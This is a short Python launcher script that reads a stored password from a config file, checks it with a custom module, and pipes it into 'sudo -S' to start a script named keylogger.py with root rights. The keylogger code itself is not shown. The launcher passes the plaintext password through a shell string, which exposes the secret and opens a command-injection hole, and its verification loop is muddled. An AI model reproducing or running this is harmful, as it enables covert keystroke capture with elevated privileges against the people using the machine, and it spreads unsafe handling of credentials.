import password
import subprocess

f = open("config/password.txt","r")
pw = f.readline()
while not password.verify(pw):
	password.getPassword()
	pw = f.readline()
	password.verify(pw)
subprocess.Popen("echo "+pw+" | sudo -S python keylogger.py",shell=True)
